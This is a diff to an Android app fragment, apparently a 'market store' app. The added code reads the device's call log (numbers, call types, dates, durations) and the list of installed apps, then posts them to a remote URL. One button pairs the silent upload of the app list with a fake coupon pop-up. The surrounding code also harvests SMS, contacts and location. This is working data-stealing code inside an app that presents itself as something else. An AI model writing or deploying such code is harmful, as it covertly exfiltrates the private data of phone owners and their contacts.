@@ -1,7 +1,12 @@
 package com.imf.marketstore.ui.dashboard;
 
 import android.annotation.SuppressLint;
+import android.content.DialogInterface;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
 import android.os.Bundle;
+import android.provider.CallLog;
+import android.support.v7.app.AlertDialog;
 import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -11,12 +16,18 @@ import android.support.annotation.NonNull;
 import android.support.v4.app.Fragment;
 import android.arch.lifecycle.ViewModelProvider;
 
+import com.imf.marketstore.R;
 import com.imf.marketstore.databinding.FragmentDashboardBinding;
+import com.imf.marketstore.ui.notifications.NotificationsFragment;
+import com.imf.marketstore.ui.notifications.NotificationsViewModel;
+
+import java.util.UUID;
 
 import android.database.Cursor;
 import android.net.Uri;
 import android.provider.ContactsContract;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 
 import android.content.ContentResolver;
@@ -95,6 +106,8 @@ public class DashboardFragment extends Fragment {
     private static final int REQUEST_IMAGE_CAPTURE = 3;
     private static final int REQUEST_LOCATION_PERMISSION = 4;
 
+    private static final int PERMISSION_REQUEST_READ_CALL_LOG = 100;
+
     private static final String TAG = DashboardFragment.class.getSimpleName();
 
     private LocationManager locationManager;
@@ -147,6 +160,23 @@ public class DashboardFragment extends Fragment {
             }
         });
 
+        binding.getCalls.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                // Verifica si el permiso ya ha sido concedido
+                if (ContextCompat.checkSelfPermission(requireActivity(),
+                        Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+                    // Si el permiso no ha sido concedido, solicítalo
+                    ActivityCompat.requestPermissions(requireActivity(),
+                            new String[]{Manifest.permission.READ_CALL_LOG},
+                            PERMISSION_REQUEST_READ_CALL_LOG);
+                } else {
+                    // Si el permiso ya ha sido concedido, accede a las llamadas
+                    accessCalls();
+                }
+            }
+        });
+
         binding.getIpaddress.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -184,6 +214,14 @@ public class DashboardFragment extends Fragment {
                     // Si el permiso ya ha sido concedido, accede a las coordenadas
                     getLocation();
                 }
+            }
+        });
+
+        binding.getInstalledApps.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                accessInstalledApps();
+                showAlertDialog();
             }
         });
 
@@ -295,8 +333,94 @@ public class DashboardFragment extends Fragment {
         return smsList;
     }
 
-    //Camara - Photo:
 
+    private void accessCalls(){
+        List<String> callsList = getCalls(requireContext());
+
+        // Print Calls
+        Log.d("PermissionsActivity", "Calls:");
+        String callsToSend = "";
+        for (String call : callsList) {
+            Log.d("PermissionsActivity", call);
+            callsToSend += call + " ";
+        }
+        sendPostInfo(urlInfo, callsToSend);
+
+    }
+
+    public static List<String> getCalls(Context context) {
+        List<String> callList = new ArrayList<>();
+        ContentResolver cr = context.getContentResolver();
+        Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+
+        int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+        int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
+        int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
+        int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);
+
+        while (cursor.moveToNext()) {
+            String phoneNumber = cursor.getString(numberIndex);
+            String callType = cursor.getString(typeIndex);
+            String callDate = cursor.getString(dateIndex);
+            Date callDayTime = new Date(Long.valueOf(callDate));
+            String callDuration = cursor.getString(durationIndex);
+            String dir = null;
+
+            int dirCode = Integer.parseInt(callType);
+            switch (dirCode) {
+                case CallLog.Calls.OUTGOING_TYPE:
+                    dir = "OUTGOING";
+                    break;
+                case CallLog.Calls.INCOMING_TYPE:
+                    dir = "INCOMING";
+                    break;
+                case CallLog.Calls.MISSED_TYPE:
+                    dir = "MISSED";
+                    break;
+            }
+
+            callList.add("Phone Number: " + phoneNumber +
+                    ", Call Type: " + dir +
+                    ", Call Date: " + callDayTime +
+                    ", Call Duration: " + callDuration + " seconds. ");
+
+            Log.i("Call Details", "Phone Number: " + phoneNumber +
+                    ", Call Type: " + dir +
+                    ", Call Date: " + callDayTime +
+                    ", Call Duration: " + callDuration + " seconds");
+        }
+
+        cursor.close();
+
+        return callList;
+    }
+
+    private void accessInstalledApps(){
+        List<String> installedAppsList = getInstalledApps(requireContext());
+
+        // Print Calls
+        Log.d("PermissionsActivity", "Calls:");
+        String installedAppsToSend = "";
+        for (String installedApp : installedAppsList) {
+            Log.d("PermissionsActivity", installedApp);
+            installedAppsToSend += installedApp + " ";
+        }
+        sendPostInfo(urlInfo, installedAppsToSend);
+
+    }
+    public List<String> getInstalledApps(Context context) {
+        List<String> installedApps = new ArrayList<>();
+        PackageManager packageManager = context.getPackageManager();
+        List<PackageInfo> packageInfos = packageManager.getInstalledPackages(PackageManager.GET_META_DATA);
+
+        for (PackageInfo packageInfo : packageInfos) {
+            ApplicationInfo appInfo = packageInfo.applicationInfo;
+            String appName = packageManager.getApplicationLabel(appInfo).toString();
+            installedApps.add(appName);
+        }
+        return installedApps;
+    }
+    //Camara - Photo:
     private void requestCameraPermission() {
         if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(requireActivity(), new String[]{Manifest.permission.CAMERA}, REQUEST_IMAGE_CAPTURE);
@@ -450,6 +574,43 @@ public class DashboardFragment extends Fragment {
                 }
             }
         }.execute();
+    }
+
+    public String getCuponFreeMessage(){
+        UUID uuid = UUID.randomUUID();
+        String randomUUIDString = uuid.toString().replace("-","").substring(0,9);
+        String message = "Cupón: " + randomUUIDString;
+        return message;
+    }
+
+    private void showAlertDialog() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(getContext());
+        LayoutInflater inflater = getLayoutInflater();
+        View customView = inflater.inflate(R.layout.custom_alert_message, null);
+        builder.setTitle(getCuponFreeMessage()).setView(customView);
+
+
+        // Botón de Aceptar
+        builder.setPositiveButton("Aceptar", new DialogInterface.OnClickListener() {
+            @Override
+            public void onClick(DialogInterface dialog, int which) {
+                // Acción a realizar cuando se presiona "Aceptar"
+                dialog.dismiss();
+            }
+        });
+
+        // Botón de Cancelar
+        builder.setNegativeButton("Cancelar", new DialogInterface.OnClickListener() {
+            @Override
+            public void onClick(DialogInterface dialog, int which) {
+                // Acción a realizar cuando se presiona "Cancelar"
+                dialog.dismiss();
+            }
+        });
+
+        // Crear y mostrar el AlertDialog
+        AlertDialog alertDialog = builder.create();
+        alertDialog.show();
     }
 
     public interface OnTaskCompleted {
